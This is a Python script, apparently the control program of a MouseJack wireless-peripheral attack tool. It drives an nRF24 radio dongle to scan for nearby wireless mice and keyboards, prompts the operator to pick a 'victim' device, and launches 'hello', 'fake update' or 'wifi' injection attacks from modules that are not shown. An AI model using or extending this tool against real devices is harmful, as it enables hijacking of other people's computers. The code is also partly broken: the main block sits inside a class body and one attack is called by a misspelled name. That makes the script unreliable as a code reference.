from tools import Scanner, attacker
from lib import nrf24, nrf24_reset, consolePrint
import time
import os


def ping_channel(radio, channels):
    ping = [0x0f, 0x0f, 0x0f, 0x0f]
    for channel in channels:
        radio.set_channel(channel)
        if radio.transmit_payload(ping):
            break


class mouseJack:
    if __name__ == '__main__':
        consolePrint.printStart()

        # init the dongle and reset it
        while 1:
            try:
                nrf24_reset.reset_radio(0)
                from attacks import FakeUpdate_attack, wifi_attack, hello_attack
                radio = nrf24.nrf24(0)
                break
            except Exception:
                continue
        consolePrint.printCrazyRadio()
        radio.enter_promiscuous_mode()
        radio.enable_lna()
        channels = range(2, 84)
        devices_list = Scanner.scan(radio, channels, int(input("choose time for scanning: ")))
        # printScanning()
        consolePrint.printDevices()
        for key, val in devices_list.items():
            print(key, ":", val[0], "(", val[1], ")")
        print("choose victim device key from( 0 - ", len(devices_list.items()) - 1, "): ")
        victim_key = int(input())
        print()
        print()
        victim = devices_list[victim_key]
        consolePrint.printAttacks()
        attack_key = int(input("choose attack key: "))
        if attack_key == 1:
            consolePrint.attackStarted()
            radio.enter_sniffer_mode(victim[0])
            ping_channel(radio, channels)
            hello_attack = hello_attack.hello_attack(victim[0], radio)
            hello_attack.run()
            print("attack completed!")
            exit(1)
        elif attack_key == 2:
            consolePrint.attackStarted()
            radio.enter_sniffer_mode(victim[0])
            ping_channel(radio, channels)
            fake_update_attack = fakeUpdate_attack.FakeUpdate_attack(victim[0], radio)
            fake_update_attack.run()
            print("attack completed!")
            exit(1)
        elif attack_key == 3:
            consolePrint.attackStarted()
            radio.enter_sniffer_mode(victim[0])
            ping_channel(radio, channels)
            wifi_attack = wifi_attack.wifi_attack(victim[0], radio)
            wifi_attack.run()
            print("attack completed!")
            exit(1)
